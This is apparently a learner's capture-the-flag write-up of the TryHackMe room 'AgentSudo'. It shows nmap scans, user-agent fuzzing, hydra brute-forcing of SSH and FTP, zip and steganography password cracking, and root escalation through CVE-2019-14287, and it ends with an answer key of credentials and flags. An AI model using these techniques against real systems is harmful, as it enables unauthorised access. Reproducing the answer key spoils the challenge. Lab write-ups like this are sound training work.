---
title: AgentSudo
tags:
  - fetus
---
## nmap results:
- `Dscan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 05:57 EDT
Nmap scan report for 10.10.196.182
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 25.94 seconds
```
- `nmap -p- -Pn -A -T4 10.10.196.182 > Ascan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 05:56 EDT
Nmap scan report for 10.10.196.182
Host is up (0.23s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Aggressive OS guesses: Linux 4.4 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (96%), Linux 4.15 (96%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.10 - 3.13 (95%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (94%), Linux 3.10 - 4.11 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   191.20 ms 10.21.0.1
2   241.01 ms 10.10.196.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1168.88 seconds
```
### version enum:
- `OpenSSH 7.6p1` has 3 username enum scripts for all versions under 7.7 it seems
- theres a DoS for `vsftpd 3.0.3` but thats useless for us
## http enum:
- just this on the root page: 
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```
- something to do with the user-agent. gonna keep it in the back pocket for now
- time to do some dirbusting
### dirbusting results: 
- nothing showed up on `feroxbuster` or `ffuf`
### http enum 2:
- lets see what the user-agent thing was by capturing an http result and messing with the [[http-headers]] 
- gonna use [[A-Z wordlist]] generated with [[simpleAtoZgen.py]] in the `user-agent` header 
- http request:
```http
GET / HTTP/1.1
Host: 10.10.196.182
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: A
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```
- intruder result: <br>
![[agentSudoIntruderResult.png]]
- theres only one redirect. everything else is the same 
- `http-response` for user-agent `C`: 
```http
HTTP/1.1 302 Found
Date: Mon, 14 Apr 2025 10:43:58 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: agent_C_attention.php
Content-Length: 218
Keep-Alive: timeout=5, max=98
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


<!DocType html>
<html>
	<head>
		<title>Annoucement</title>
	</head>

	<body>
		<p>
			Dear agents,
			<br><br>
			Use your own <b>
			codename
			</b> 
			as user-agent to access the site.
			<br><br>
			From,<br>
			Agent R
		</p>
	</body>
</html>
```
- we can see the actual location in the `Location` header where it says: `agent_C_attention.php`
- lets send a GET request there and see what we get
- http-response:
```http
HTTP/1.1 200 OK
Date: Mon, 14 Apr 2025 10:59:57 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 177
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 


```
- got a possible uname `chris`. his password's apparently weak
- so far the possible users are:
```
chris
Agent R
Agent J
```
## ssh and ftp bruteforcing: 
- `hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://10.10.196.182:22` while that runs imma run an ftp bruteforce as well since the room asks for it. oh and all nmap ftp scripts as well cuz why tf not <br>
 ![[agentSudoBruteforceSS.png]]
 - fun lmao. we already got the pass from ftp as well
 - found creds: 
```
chris:crystal 
```
## ftp stuff:
- lets try logging in and see what we find in there
- yaay logged in. lets see whats there 
```
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt                                                                          
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg                                                                         
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png  
```
- lets get em all hqhqhqhq
- `wget -r ftp://chris:crystal@10.10.196.182/`
- `To_agentJ.txt`: 
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```
- hmmmmmmm seems like all these alien photos are somehow fake and theres a real photo stored at /home/agentJ or something. and theres apparently user creds stored in these images. time to use steghide babyyyyy 
- the two pictures: 
	- `cutie.png`:<br>
	![[cutie.png]]
	- `cute-alien.jpg`:<br>
	![[cute-alien.jpg]]
	(the fake transparency really pisses me off smh)

## image data extraction and enum:
- used `exiftool` to see if there was any interesting matadata but didnt get anything
- ran `strings` against both of them. theres a `To_agentR.txt` in the png file. didnt manage to find anything in the jpeg output cuz im not used to analyzing strings outputs yet
- huh. [[embedded file signatures]]
- did `xxd cute-alien.jpg | grep "PK"`
- this showed up: 
```
00000820: 047b 7151 c8a6 e483 1f41 c1cf 1550 4b14  .{qQ.....A...PK.
000016a0: 1cd1 3c68 1c08 a4f3 4150 4b60 8c12 3918  ..<h....APK`..9.
```
- theres probably a zip file stored in the jpg file
- did `binwalk cutie.png `
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
#### data extraction from png
- did `binwalk -e --run-as=root cutie.png`: 
- got these 3 files:
```
-rw-r--r-- 1 root root 279312 Apr 14 07:58 365
-rw-r--r-- 1 root root  33973 Apr 14 07:58 365.zlib
-rw-r--r-- 1 root root    280 Apr 14 07:58 8702.zip
```
- the zip file asks for a password. gonna use [[fcrackzip]] with rockyou
- `fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt _cutie.png.extracted/8702.zip`
- didnt work. gonna try with [[john the ripper]] instead
- `zip2john _cutie.png.extracted/8702.zip > z2jHash.txt`
- `z2jHash.txt`:
```
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:_cutie.png.extracted/8702.zip
```
- explanation of the hash string: (gonna look into this more)<br>
	![[agentSudoHashStringExplanation.png]]
- `john z2jHash.txt --wordlist=/usr/share/wordlists/rockyou.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2025-04-14 08:46) 3.571g/s 87771p/s 87771c/s 87771C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- yaay the zip pass is `alien`
- extracted it with `7z x -palien filename` and got `To_AgentR.txt`:
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
- seems like a hash (its not. its base64)
- ran `echo QXJlYTUx | base64 -d` and got `Area51` which was the pass for steghide
#### data extraction from jpg
- gonna use [[steghide]] to get stuff from this 
- did `steghide info cute-alien.jpg` but it asks for a passphrase. gonna crack it with [[stegcracker]] and rockyou 
- `stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt`
```
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2025 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'cute-alien.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: Area51doro1111
Tried 441075 passwords                                                                                                                         
Your file has been written to: cute-alien.jpg.out                                                                                              
Area51 
```
- new found pass: `Area51` 
- `cute-alien.jpg`: 
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
- omg more new creds: 
```
james:hackerrules!
```

## priv esc and stuff as james: 
- [[SSH]]'d into the server with the creds 
- did `sudo -l` and found this:
```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
- theres an image as well called `Alien_autospy.jpg`. need to reverse search it on yandex and get the incident name
- `Alien_autospy.jpg`: (the misspelled 'autospy' bothers me so much omfg)<br>
![[Alien_autospy.jpg]]
- ooooh roswell ufo incident :0
- lets get to the priv esc part now
- googled it and found a CVE `CVE-2019-14287`:
- [[CVE-2019-14287]]
- priv esc:<br>
![[agentSudoPrivEsc.png]]
- why it works: 
	- james can run bash as any user other than root. and the user id `-1` in this case gets stored in binary with the `two's complement` rule, which then turns it into the maximum value of a 32 bit integer:
		- `11111111 11111111 11111111 11111111 = 4,294,967,295 (0xFFFFFFFF)` 
	- and when the system sees this max value it wraps around and treats it like 0. and since we're not directly using 0 here it doesnt see we're running it as root and runs it anyways. and due to the conversion in binary, it gets treated as 0 and we get /bin/bash as root hehe
- `root.txt`:
```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```
---
## THM answers: 
- ports open: 3
- how do i redirect myself to a secret page?: user-agent
- agent name: chris
- ftp pass: crystal 
- zip pass: alien 
- steg pass: Area51 
- other agent: james 
- ssh pass: hackerrules!
- user flag: b03d975e8c92a7c04146cfa7a5a313c7
- incident name: roswell alien autopsy
- CVE: CVE-2019-14287
- root flag: b53a02f55b57d4439e3341834d70c062
- Agent R: DesKel
---
- DOS stub